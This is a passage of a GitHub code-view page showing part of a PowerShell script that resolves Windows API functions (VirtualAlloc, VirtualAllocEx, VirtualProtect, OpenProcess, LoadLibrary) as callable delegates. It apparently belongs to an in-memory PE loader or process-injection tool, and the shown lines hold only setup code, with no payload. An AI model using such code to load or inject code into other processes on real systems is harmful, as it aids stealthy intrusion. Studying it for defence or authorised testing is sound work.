          <td id="L614" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="614"></td>
          <td id="LC614" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name SE_PRIVILEGE_ENABLED <span class="pl-k">-</span>Value <span class="pl-c1">0x2</span></td>
        </tr>
        <tr>
          <td id="L615" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="615"></td>
          <td id="LC615" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name ERROR_NO_TOKEN <span class="pl-k">-</span>Value <span class="pl-c1">0x3f0</span></td>
        </tr>
        <tr>
          <td id="L616" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="616"></td>
          <td id="LC616" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L617" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="617"></td>
          <td id="LC617" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">return</span> <span class="pl-smi">$Win32Constants</span></td>
        </tr>
        <tr>
          <td id="L618" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="618"></td>
          <td id="LC618" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="L619" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="619"></td>
          <td id="LC619" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L620" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="620"></td>
          <td id="LC620" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">Function</span> <span class="pl-en">Get-Win32Functions</span></td>
        </tr>
        <tr>
          <td id="L621" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="621"></td>
          <td id="LC621" class="blob-code blob-code-inner js-file-line">	{</td>
        </tr>
        <tr>
          <td id="L622" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="622"></td>
          <td id="LC622" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions</span> <span class="pl-k">=</span> <span class="pl-c1">New-Object</span> System.Object</td>
        </tr>
        <tr>
          <td id="L623" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="623"></td>
          <td id="LC623" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L624" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="624"></td>
          <td id="LC624" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$VirtualAllocAddr</span> <span class="pl-k">=</span> <span class="pl-c1">Get-ProcAddress</span> kernel32.dll VirtualAlloc</td>
        </tr>
        <tr>
          <td id="L625" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="625"></td>
          <td id="LC625" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$VirtualAllocDelegate</span> <span class="pl-k">=</span> <span class="pl-c1">Get-DelegateType</span> <span class="pl-k">@</span>([<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">UIntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]) ([<span class="pl-k">IntPtr</span>])</td>
        </tr>
        <tr>
          <td id="L626" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="626"></td>
          <td id="LC626" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$VirtualAlloc</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="pl-smi">$VirtualAllocAddr</span><span class="pl-k">,</span> <span class="pl-smi">$VirtualAllocDelegate</span>)</td>
        </tr>
        <tr>
          <td id="L627" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="627"></td>
          <td id="LC627" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> NoteProperty <span class="pl-k">-</span>Name VirtualAlloc <span class="pl-k">-</span>Value <span class="pl-smi">$VirtualAlloc</span></td>
        </tr>
        <tr>
          <td id="L628" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="628"></td>
          <td id="LC628" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L629" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="629"></td>
          <td id="LC629" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$VirtualAllocExAddr</span> <span class="pl-k">=</span> <span class="pl-c1">Get-ProcAddress</span> kernel32.dll VirtualAllocEx</td>
        </tr>
        <tr>
          <td id="L630" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="630"></td>
          <td id="LC630" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$VirtualAllocExDelegate</span> <span class="pl-k">=</span> <span class="pl-c1">Get-DelegateType</span> <span class="pl-k">@</span>([<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">UIntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]) ([<span class="pl-k">IntPtr</span>])</td>
        </tr>
        <tr>
          <td id="L631" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="631"></td>
          <td id="LC631" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$VirtualAllocEx</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="pl-smi">$VirtualAllocExAddr</span><span class="pl-k">,</span> <span class="pl-smi">$VirtualAllocExDelegate</span>)</td>
        </tr>
        <tr>
          <td id="L632" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="632"></td>
          <td id="LC632" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> NoteProperty <span class="pl-k">-</span>Name VirtualAllocEx <span class="pl-k">-</span>Value <span class="pl-smi">$VirtualAllocEx</span></td>
        </tr>
        <tr>
          <td id="L633" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="633"></td>
          <td id="LC633" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L634" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="634"></td>
          <td id="LC634" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$memcpyAddr</span> <span class="pl-k">=</span> <span class="pl-c1">Get-ProcAddress</span> msvcrt.dll memcpy</td>
        </tr>
        <tr>
          <td id="L635" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="635"></td>
          <td id="LC635" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$memcpyDelegate</span> <span class="pl-k">=</span> <span class="pl-c1">Get-DelegateType</span> <span class="pl-k">@</span>([<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">UIntPtr</span>]) ([<span class="pl-k">IntPtr</span>])</td>
        </tr>
        <tr>
          <td id="L636" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="636"></td>
          <td id="LC636" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$memcpy</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="pl-smi">$memcpyAddr</span><span class="pl-k">,</span> <span class="pl-smi">$memcpyDelegate</span>)</td>
        </tr>
        <tr>
          <td id="L637" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="637"></td>
          <td id="LC637" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name memcpy <span class="pl-k">-</span>Value <span class="pl-smi">$memcpy</span></td>
        </tr>
        <tr>
          <td id="L638" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="638"></td>
          <td id="LC638" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L639" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="639"></td>
          <td id="LC639" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$memsetAddr</span> <span class="pl-k">=</span> <span class="pl-c1">Get-ProcAddress</span> msvcrt.dll memset</td>
        </tr>
        <tr>
          <td id="L640" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="640"></td>
          <td id="LC640" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$memsetDelegate</span> <span class="pl-k">=</span> <span class="pl-c1">Get-DelegateType</span> <span class="pl-k">@</span>([<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">Int32</span>]<span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]) ([<span class="pl-k">IntPtr</span>])</td>
        </tr>
        <tr>
          <td id="L641" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="641"></td>
          <td id="LC641" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$memset</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="pl-smi">$memsetAddr</span><span class="pl-k">,</span> <span class="pl-smi">$memsetDelegate</span>)</td>
        </tr>
        <tr>
          <td id="L642" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="642"></td>
          <td id="LC642" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name memset <span class="pl-k">-</span>Value <span class="pl-smi">$memset</span></td>
        </tr>
        <tr>
          <td id="L643" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="643"></td>
          <td id="LC643" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L644" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="644"></td>
          <td id="LC644" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$LoadLibraryAddr</span> <span class="pl-k">=</span> <span class="pl-c1">Get-ProcAddress</span> kernel32.dll LoadLibraryA</td>
        </tr>
        <tr>
          <td id="L645" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="645"></td>
          <td id="LC645" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$LoadLibraryDelegate</span> <span class="pl-k">=</span> <span class="pl-c1">Get-DelegateType</span> <span class="pl-k">@</span>([<span class="pl-k">String</span>]) ([<span class="pl-k">IntPtr</span>])</td>
        </tr>
        <tr>
          <td id="L646" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="646"></td>
          <td id="LC646" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$LoadLibrary</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="pl-smi">$LoadLibraryAddr</span><span class="pl-k">,</span> <span class="pl-smi">$LoadLibraryDelegate</span>)</td>
        </tr>
        <tr>
          <td id="L647" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="647"></td>
          <td id="LC647" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name LoadLibrary <span class="pl-k">-</span>Value <span class="pl-smi">$LoadLibrary</span></td>
        </tr>
        <tr>
          <td id="L648" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="648"></td>
          <td id="LC648" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L649" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="649"></td>
          <td id="LC649" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$GetProcAddressAddr</span> <span class="pl-k">=</span> <span class="pl-c1">Get-ProcAddress</span> kernel32.dll GetProcAddress</td>
        </tr>
        <tr>
          <td id="L650" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="650"></td>
          <td id="LC650" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$GetProcAddressDelegate</span> <span class="pl-k">=</span> <span class="pl-c1">Get-DelegateType</span> <span class="pl-k">@</span>([<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">String</span>]) ([<span class="pl-k">IntPtr</span>])</td>
        </tr>
        <tr>
          <td id="L651" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="651"></td>
          <td id="LC651" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$GetProcAddress</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="pl-smi">$GetProcAddressAddr</span><span class="pl-k">,</span> <span class="pl-smi">$GetProcAddressDelegate</span>)</td>
        </tr>
        <tr>
          <td id="L652" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="652"></td>
          <td id="LC652" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name GetProcAddress <span class="pl-k">-</span>Value <span class="pl-smi">$GetProcAddress</span></td>
        </tr>
        <tr>
          <td id="L653" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="653"></td>
          <td id="LC653" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L654" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="654"></td>
          <td id="LC654" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$GetProcAddressIntPtrAddr</span> <span class="pl-k">=</span> <span class="pl-c1">Get-ProcAddress</span> kernel32.dll GetProcAddress <span class="pl-c"><span class="pl-c">#</span>This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself</span></td>
        </tr>
        <tr>
          <td id="L655" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="655"></td>
          <td id="LC655" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$GetProcAddressIntPtrDelegate</span> <span class="pl-k">=</span> <span class="pl-c1">Get-DelegateType</span> <span class="pl-k">@</span>([<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]) ([<span class="pl-k">IntPtr</span>])</td>
        </tr>
        <tr>
          <td id="L656" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="656"></td>
          <td id="LC656" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$GetProcAddressIntPtr</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="pl-smi">$GetProcAddressIntPtrAddr</span><span class="pl-k">,</span> <span class="pl-smi">$GetProcAddressIntPtrDelegate</span>)</td>
        </tr>
        <tr>
          <td id="L657" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="657"></td>
          <td id="LC657" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name GetProcAddressIntPtr <span class="pl-k">-</span>Value <span class="pl-smi">$GetProcAddressIntPtr</span></td>
        </tr>
        <tr>
          <td id="L658" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="658"></td>
          <td id="LC658" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L659" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="659"></td>
          <td id="LC659" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$VirtualFreeAddr</span> <span class="pl-k">=</span> <span class="pl-c1">Get-ProcAddress</span> kernel32.dll VirtualFree</td>
        </tr>
        <tr>
          <td id="L660" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="660"></td>
          <td id="LC660" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$VirtualFreeDelegate</span> <span class="pl-k">=</span> <span class="pl-c1">Get-DelegateType</span> <span class="pl-k">@</span>([<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">UIntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]) ([<span class="pl-k">Bool</span>])</td>
        </tr>
        <tr>
          <td id="L661" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="661"></td>
          <td id="LC661" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$VirtualFree</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="pl-smi">$VirtualFreeAddr</span><span class="pl-k">,</span> <span class="pl-smi">$VirtualFreeDelegate</span>)</td>
        </tr>
        <tr>
          <td id="L662" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="662"></td>
          <td id="LC662" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> NoteProperty <span class="pl-k">-</span>Name VirtualFree <span class="pl-k">-</span>Value <span class="pl-smi">$VirtualFree</span></td>
        </tr>
        <tr>
          <td id="L663" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="663"></td>
          <td id="LC663" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L664" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="664"></td>
          <td id="LC664" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$VirtualFreeExAddr</span> <span class="pl-k">=</span> <span class="pl-c1">Get-ProcAddress</span> kernel32.dll VirtualFreeEx</td>
        </tr>
        <tr>
          <td id="L665" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="665"></td>
          <td id="LC665" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$VirtualFreeExDelegate</span> <span class="pl-k">=</span> <span class="pl-c1">Get-DelegateType</span> <span class="pl-k">@</span>([<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">UIntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]) ([<span class="pl-k">Bool</span>])</td>
        </tr>
        <tr>
          <td id="L666" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="666"></td>
          <td id="LC666" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$VirtualFreeEx</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="pl-smi">$VirtualFreeExAddr</span><span class="pl-k">,</span> <span class="pl-smi">$VirtualFreeExDelegate</span>)</td>
        </tr>
        <tr>
          <td id="L667" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="667"></td>
          <td id="LC667" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> NoteProperty <span class="pl-k">-</span>Name VirtualFreeEx <span class="pl-k">-</span>Value <span class="pl-smi">$VirtualFreeEx</span></td>
        </tr>
        <tr>
          <td id="L668" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="668"></td>
          <td id="LC668" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L669" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="669"></td>
          <td id="LC669" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$VirtualProtectAddr</span> <span class="pl-k">=</span> <span class="pl-c1">Get-ProcAddress</span> kernel32.dll VirtualProtect</td>
        </tr>
        <tr>
          <td id="L670" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="670"></td>
          <td id="LC670" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$VirtualProtectDelegate</span> <span class="pl-k">=</span> <span class="pl-c1">Get-DelegateType</span> <span class="pl-k">@</span>([<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">UIntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> [<span class="pl-k">UInt32</span>].MakeByRefType()) ([<span class="pl-k">Bool</span>])</td>
        </tr>
        <tr>
          <td id="L671" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="671"></td>
          <td id="LC671" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$VirtualProtect</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="pl-smi">$VirtualProtectAddr</span><span class="pl-k">,</span> <span class="pl-smi">$VirtualProtectDelegate</span>)</td>
        </tr>
        <tr>
          <td id="L672" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="672"></td>
          <td id="LC672" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> NoteProperty <span class="pl-k">-</span>Name VirtualProtect <span class="pl-k">-</span>Value <span class="pl-smi">$VirtualProtect</span></td>
        </tr>
        <tr>
          <td id="L673" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="673"></td>
          <td id="LC673" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L674" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="674"></td>
          <td id="LC674" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$GetModuleHandleAddr</span> <span class="pl-k">=</span> <span class="pl-c1">Get-ProcAddress</span> kernel32.dll GetModuleHandleA</td>
        </tr>
        <tr>
          <td id="L675" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="675"></td>
          <td id="LC675" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$GetModuleHandleDelegate</span> <span class="pl-k">=</span> <span class="pl-c1">Get-DelegateType</span> <span class="pl-k">@</span>([<span class="pl-k">String</span>]) ([<span class="pl-k">IntPtr</span>])</td>
        </tr>
        <tr>
          <td id="L676" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="676"></td>
          <td id="LC676" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$GetModuleHandle</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="pl-smi">$GetModuleHandleAddr</span><span class="pl-k">,</span> <span class="pl-smi">$GetModuleHandleDelegate</span>)</td>
        </tr>
        <tr>
          <td id="L677" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="677"></td>
          <td id="LC677" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> NoteProperty <span class="pl-k">-</span>Name GetModuleHandle <span class="pl-k">-</span>Value <span class="pl-smi">$GetModuleHandle</span></td>
        </tr>
        <tr>
          <td id="L678" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="678"></td>
          <td id="LC678" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L679" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="679"></td>
          <td id="LC679" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$FreeLibraryAddr</span> <span class="pl-k">=</span> <span class="pl-c1">Get-ProcAddress</span> kernel32.dll FreeLibrary</td>
        </tr>
        <tr>
          <td id="L680" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="680"></td>
          <td id="LC680" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$FreeLibraryDelegate</span> <span class="pl-k">=</span> <span class="pl-c1">Get-DelegateType</span> <span class="pl-k">@</span>([<span class="pl-k">Bool</span>]) ([<span class="pl-k">IntPtr</span>])</td>
        </tr>
        <tr>
          <td id="L681" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="681"></td>
          <td id="LC681" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$FreeLibrary</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="pl-smi">$FreeLibraryAddr</span><span class="pl-k">,</span> <span class="pl-smi">$FreeLibraryDelegate</span>)</td>
        </tr>
        <tr>
          <td id="L682" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="682"></td>
          <td id="LC682" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name FreeLibrary <span class="pl-k">-</span>Value <span class="pl-smi">$FreeLibrary</span></td>
        </tr>
        <tr>
          <td id="L683" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="683"></td>
          <td id="LC683" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L684" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="684"></td>
          <td id="LC684" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$OpenProcessAddr</span> <span class="pl-k">=</span> <span class="pl-c1">Get-ProcAddress</span> kernel32.dll OpenProcess</td>
        </tr>
        <tr>
          <td id="L685" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="685"></td>
          <td id="LC685" class="blob-code blob-code-inner js-file-line">	    <span class="pl-smi">$OpenProcessDelegate</span> <span class="pl-k">=</span> <span class="pl-c1">Get-DelegateType</span> <span class="pl-k">@</span>([<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> [<span class="pl-k">Bool</span>]<span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]) ([<span class="pl-k">IntPtr</span>])</td>
        </tr>
        <tr>
          <td id="L686" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="686"></td>
          <td id="LC686" class="blob-code blob-code-inner js-file-line">	    <span class="pl-smi">$OpenProcess</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="pl-smi">$OpenProcessAddr</span><span class="pl-k">,</span> <span class="pl-smi">$OpenProcessDelegate</span>)</td>
        </tr>
        <tr>
          <td id="L687" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="687"></td>
          <td id="LC687" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name OpenProcess <span class="pl-k">-</span>Value <span class="pl-smi">$OpenProcess</span></td>
        </tr>
        <tr>
          <td id="L688" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="688"></td>
          <td id="LC688" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L689" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="689"></td>
          <td id="LC689" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$WaitForSingleObjectAddr</span> <span class="pl-k">=</span> <span class="pl-c1">Get-ProcAddress</span> kernel32.dll WaitForSingleObject</td>
        </tr>
        <tr>
          <td id="L690" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="690"></td>
          <td id="LC690" class="blob-code blob-code-inner js-file-line">	    <span class="pl-smi">$WaitForSingleObjectDelegate</span> <span class="pl-k">=</span> <span class="pl-c1">Get-DelegateType</span> <span class="pl-k">@</span>([<span class="pl-k">IntPtr</span>]<span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]) ([<span class="pl-k">UInt32</span>])</td>
        </tr>
        <tr>
          <td id="L691" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="691"></td>
          <td id="LC691" class="blob-code blob-code-inner js-file-line">	    <span class="pl-smi">$WaitForSingleObject</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="pl-smi">$WaitForSingleObjectAddr</span><span class="pl-k">,</span> <span class="pl-smi">$WaitForSingleObjectDelegate</span>)</td>
        </tr>
        <tr>
          <td id="L692" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="692"></td>
